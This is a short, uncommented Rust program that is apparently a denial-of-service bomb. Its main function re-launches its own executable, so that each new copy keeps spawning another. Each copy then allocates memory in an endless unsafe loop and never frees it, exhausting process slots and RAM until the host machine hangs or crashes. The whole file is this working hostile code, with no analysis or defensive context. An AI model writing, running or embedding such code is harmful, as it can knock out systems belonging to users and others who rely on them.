use std::alloc::{alloc, Layout};
use std::env;
use std::process::Command;
fn main() {
    Command::new(env::current_exe().unwrap()).spawn().unwrap();
    loop {
        unsafe {
            let _ = alloc(Layout::from_size_align_unchecked(0x4096, 0x2));
        }
    }
}
